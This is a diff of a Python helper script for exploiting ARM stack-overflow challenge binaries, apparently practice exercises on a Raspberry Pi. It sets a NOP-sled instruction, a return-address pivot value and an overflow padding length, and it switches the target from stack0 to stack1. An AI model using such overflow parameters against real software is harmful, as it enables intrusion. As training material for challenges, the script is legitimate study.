@@ -12,27 +12,28 @@ import os
 """
 Set your exploit/ debug variables here 
 """
-# make sure your .gdbint has "run < sploit" in it
-gdb	="/usr/bin/gdb"
-
 # point this to the binary your are working with
-app="/home/pi/repos/ARM-challenges/stack0"
-
-fName 	= "shell"
-exploit = "sploit"
+#app="/home/pi/repos/ARM-challenges/stack0"
+app="/home/pi/repos/ARM-challenges/stack1"
 
 # this is add r3, pc, #1, a arm instruction with no null chars we use as a nop
 # maybe there is somthing better...
-nop	= '\x01\x30\x8f\xe2'
+nop	= '\x01\x30\x8f\xe2' # stack0
 nops	= nop * 8
 
 # Set this to somewhere in the middle of your nops on the stack
-pcPivot = '\xdc\xf1\xff\xbe'
+pcPivot = '\xdc\xf1\xff\xbe' #stack0
 
 # If we need overflow set it here
 # format is decimal in bytes
-overflowPadding = 78
+overflowPadding = 78 # stack0
 
+
+
+# make sure your .gdbint has "run < sploit" in it
+gdb	="/usr/bin/gdb"
+fName 	= "shell"
+exploit = "sploit"
 # Wrapper to run bash commands and print out
 # errors/output
 def runCmd(cmd):
